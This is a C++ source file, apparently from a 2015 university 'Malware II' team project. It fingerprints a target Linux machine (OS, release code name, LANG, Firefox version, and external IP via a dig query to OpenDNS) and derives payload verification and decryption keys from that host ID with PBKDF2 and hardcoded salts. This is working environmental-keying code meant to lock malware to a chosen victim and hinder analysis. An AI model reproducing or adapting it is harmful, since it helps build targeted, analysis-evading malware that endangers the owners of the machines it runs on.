/******************************************************************************************************************************************
EC700 Spring 2015
Team Bravo (Malware II)

Description: Creates a host ID, verification key, and decryption key on the target machine

LIMITATION: order of commands is hardcoded...keygen.cpp allows malware author to choose order of commands to generate host ID
*/

#include <iostream>
#include <cstring>
#include <string>
#include <stdio.h>
#include <stdlib.h>
#include <algorithm>
#include <openssl/evp.h>
#include <openssl/err.h>


/****************************************************** Globals **************************************************************************/
static const int bufLen = 60; // Length of buffers that will store command outputs
static std::string hostId = "";

		
/***************************************************** Functions *************************************************************************/
// Get OS of targeted system
std::string getOs() {
	const char osCmd[]= "uname -o";
	std::string os = "";
	char osBuf[bufLen];
	FILE *fp = popen(osCmd, "r");
	if (fp == NULL) {
		printf("Error: could not get OS type from keyGen.cpp file.\n");
	}

	while (!feof(fp)) {
		if (fgets(osBuf, bufLen, fp) != NULL) {
			os += osBuf;
		}
	}

	fclose(fp);

	return os;
}

// Get code name of targeted system
std::string getCodeName()
{
	const char codeNameCmd[]= "lsb_release -cs";
	std::string codeName = "";
	char codeNameBuf[bufLen];
	FILE *fp = popen(codeNameCmd, "r");
	if (fp == NULL) {
		printf("Error: could not get code name from keyGen.cpp file.\n");
	}

	while (!feof(fp)) {
		if (fgets(codeNameBuf, bufLen, fp) != NULL) {
			codeName += codeNameBuf;
  		}
	}

	fclose(fp);

	return codeName;
}

// Get LANG environment variable of targeted system
std::string getLang() 
{
	const char langCmd[]= "echo $LANG";
	std::string lang = "";
	char langBuf[bufLen];
	FILE *fp = popen(langCmd, "r");
	if (fp == NULL) {
		printf("Error: could not get LANG variable from keyGen.cpp file.\n");
	}

	while (!feof(fp)) {
		if (fgets(langBuf, bufLen, fp) != NULL) {
			lang += langBuf;
		}
	}

  	fclose(fp);

	return lang;
}

// Get external IP of targeted system
std::string getExtIp() 
{ 
	const char extIpCmd[]= "dig myip.opendns.com @resolver1.opendns.com +short";
	std::string extIp = "";
	char extIpBuf[bufLen];
	FILE *fp = popen(extIpCmd, "r");
	if (fp == NULL) {
		printf("Error: could not get external IP from keyGen.cpp file.\n");
	}

	while (!feof(fp)) {
		if (fgets(extIpBuf, bufLen, fp) != NULL) {
			extIp += extIpBuf;
    		}
  	}

	fclose(fp);

	return extIp;
}

// Get Firefox Browser version of targeted system (TODO: Add regex to get into format "Firefox/31.0")
std::string getFirefoxVer()
{
	const char firefoxVerCmd[]= "firefox -v";
	std::string firefoxVer = "";
	char firefoxVerBuf[bufLen];
	FILE *fp = popen(firefoxVerCmd, "r");
	if (fp == NULL) {
		printf("Error: could not get Firefox version from keyGen.cpp file.\n");
	}

	while (!feof(fp)) {
		if (fgets(firefoxVerBuf, bufLen, fp) != NULL) {
			firefoxVer += firefoxVerBuf;
		}
	}

	fclose(fp);

	return firefoxVer;
}


/******************************************************** Main *****************************************************************************************
Call the chosen functions, concatenate the outputs to create the host ID, then generate verification key (verification salt + host ID) and
decryption key (decryption salt + host ID) using HMAC-SHA256
*/

int main()
{
	// Flags set by Python tool
	int osFlag = 0;
	int codeNameFlag = 0;
	int langFlag = 0;
	int firefoxVerFlag = 0;
	int extIpFlag = 0;

	// Call commands if set to true by Python tool
	if (osFlag == 1) {
		hostId += getOs();
	}

	if (codeNameFlag == 1) {
		hostId += getCodeName();
	}

	if (langFlag == 1) {
		hostId += getLang();
	}

	if (extIpFlag == 1) {
		hostId += getExtIp();
	}

	if (firefoxVerFlag == 1) {
		hostId += getFirefoxVer();
	}

	// Remove newlines
	hostId.erase(std::remove(hostId.begin(), hostId.end(), '\n'), hostId.end());
	std::cout << "Host ID: " << hostId << std::endl; // DEBUGGING
	
	// Create verification key (verification salt + host ID) and decryption key (decryption salt + host ID)
	const char *verSalt = "Uj_y6L*-mhc@77d";
	const char *decryptSalt = "FAK@$P[';wea!e2";
	int keyBufLen = 16;
	unsigned char verKeyBuf[keyBufLen];
	unsigned char decryptKeyBuf[keyBufLen];
	int iter = 10000;
	const char *hostIdCStr = hostId.c_str();
	// Create verification key (stored in verKeyBuf)
	PKCS5_PBKDF2_HMAC(hostIdCStr, strlen(hostIdCStr), (const unsigned char *)verSalt, strlen(verSalt), iter, EVP_sha256(), keyBufLen, verKeyBuf);
	// Create decryption key (stored in decryptKeyBuf)
	PKCS5_PBKDF2_HMAC(hostIdCStr, strlen(hostIdCStr), (const unsigned char *)decryptSalt, strlen(decryptSalt), iter, EVP_sha256(), keyBufLen, decryptKeyBuf);
	
	// Convert verification key to hex string and print
	char verKey[32];
	for(int i=0; i<16; i++) {
   		sprintf(&verKey[i*2], "%02x", verKeyBuf[i]);
	}
	std::cout << "Verification Key (hex): " << std::endl;
	for (int i=0; i<strlen((const char *)verKey); i++) {
		std::cout << verKey[i];
	}
	std::cout << std::endl;

	// Convert decryption key to hex string and print
	char decryptKey[32];
	for(int i=0; i<16; i++) {
   		sprintf(&decryptKey[i*2], "%02x", decryptKeyBuf[i]);
	}
	std::cout << "Decrypt Key (hex): " << std::endl;
	for (int i = 0; i<strlen((const char *)decryptKey); i++) {
		std::cout << decryptKey[i];
	}
	std::cout << std::endl;
	
	// DEBUGGING 
	/*// Uncomment to test "getOs" function
	std::string os = "";
	os = getOs();
	std::cout << "OS: " << os << std::endl;
	*/

	/*// Uncomment to test "getCodeName" function
	std::string codeName = "";
	ver = getCodeName();
	std::cout << "Code name: " << codeName << std::endl;
	*/

	/*// Uncomment to test "getLang" function
	std::string lang = "";
	lang = getLang();
	std::cout << "LANG environment variable: " << lang << std::endl;
	*/

	/*// Uncomment to test "getFirefoxVer" function
	std::string ver = "";
	ver = getFirefoxVer();
	std::cout << "Firefox version: " << ver << std::endl;
	*/

	/*// Uncomment to test "getExtIp" function
	std::string extIp = "";
	extIp = getExtIp();
	std::cout << "External IP: " << extIp << std::endl;
	*/
	
	return 0;
}
